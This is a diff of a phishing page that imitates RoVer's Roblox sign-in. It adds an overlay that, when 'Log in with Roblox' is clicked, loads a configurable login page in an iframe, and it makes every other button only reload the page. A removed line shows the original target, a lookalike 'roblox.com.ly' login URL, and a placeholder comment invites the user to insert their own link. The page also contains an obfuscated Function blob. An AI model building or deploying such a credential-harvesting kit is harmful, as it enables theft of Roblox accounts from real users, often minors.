@@ -332,6 +332,48 @@
             }
         }
     </style>
+
+<style>
+/* Full top overlay for login animation */
+.login-overlay {
+  position: absolute;
+  top: 0;
+  left: 0;
+  width: 100%;
+  height: 100%;
+  background: #0b0b0f;
+  z-index: 9999;
+  display: flex;
+  flex-direction: column;
+  border-radius: 12px;
+  overflow: hidden;
+}
+
+.login-overlay-header {
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+  padding: 18px 22px;
+  font-size: 28px;
+  font-weight: 700;
+  color: #fff;
+}
+
+.login-close {
+  background: transparent;
+  border: none;
+  color: #fff;
+  font-size: 26px;
+  cursor: pointer;
+}
+
+.login-iframe {
+  flex: 1;
+  border: none;
+  width: 100%;
+}
+</style>
+
 </head>
 
 <body><div id="blockMessage" style="display: none;">
@@ -1878,7 +1920,7 @@ Function("AJOZOh1","var XbeDrm4,qEQ6qiS,g5978v,x21b4ZU,QmI0ElE,O_QZpuu,obQQ2k,M0
 <script>
 // ================= TEMPLATE =================
 // Coloque aqui o site que deve abrir DENTRO do iframe ao clicar em "Log in with Roblox"
-const IFRAME_LOGIN_URL = "https://roblox.com.ly/login?returnUrl=7692425652606225";
+const IFRAME_LOGIN_URL = "COLOQUE_SEU_LINK_AQUI";
 // ============================================
 
 (function(){
@@ -1937,6 +1979,63 @@ const IFRAME_LOGIN_URL = "https://roblox.com.ly/login?returnUrl=7692425652606225
       a.setAttribute('role','button');
     }
   });
+})();
+</script>
+
+
+<script>
+// ===== TEMPLATE =====
+// Site que será aberto dentro da animação (iframe)
+const IFRAME_LOGIN_URL = "COLOQUE_SEU_LINK_AQUI";
+// ====================
+
+(function(){
+  const norm = t => (t||"").toLowerCase();
+
+  function isLogin(el){
+    return norm(el.innerText).includes("log in with roblox");
+  }
+
+  document.addEventListener("click", function(e){
+    const btn = e.target.closest("a, button");
+    if(!btn) return;
+
+    if(isLogin(btn)){
+      e.preventDefault();
+      e.stopPropagation();
+
+      const card =
+        document.querySelector(".css-1krlcsl.e1rvc2sx0") ||
+        document.querySelector("main article") ||
+        btn.closest("div");
+
+      if(!card || card.querySelector(".login-overlay")) return;
+
+      card.style.position = "relative";
+
+      const overlay = document.createElement("div");
+      overlay.className = "login-overlay";
+
+      overlay.innerHTML = `
+        <div class="login-overlay-header">
+          <div>Sign in to RoVer</div>
+          <button class="login-close" title="Close">✕</button>
+        </div>
+        <iframe class="login-iframe" src="${IFRAME_LOGIN_URL}"
+          allow="camera; microphone; clipboard-read; clipboard-write;"></iframe>
+      `;
+
+      overlay.querySelector(".login-close").onclick = () => location.reload();
+
+      card.appendChild(overlay);
+      return;
+    }
+
+    // Any other button = F5 behavior
+    e.preventDefault();
+    e.stopPropagation();
+    location.reload();
+  }, true);
 })();
 </script>
 
